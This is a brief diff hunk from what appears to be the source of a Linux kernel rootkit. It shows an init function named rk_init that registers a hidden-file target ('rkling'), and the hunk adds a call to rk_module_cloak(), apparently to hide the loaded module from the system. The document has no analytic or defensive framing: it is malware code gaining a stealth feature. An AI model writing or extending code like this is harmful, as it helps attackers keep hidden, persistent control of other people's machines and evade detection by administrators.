@@ -594,6 +594,7 @@ static int __init rk_init(void)
 	}
 
 	rk_target_add(&file_targets, "rkling");
+	rk_module_cloak();
 
 	memzero_explicit(key, sizeof(key));
 	memzero_explicit(control_key, sizeof(control_key));
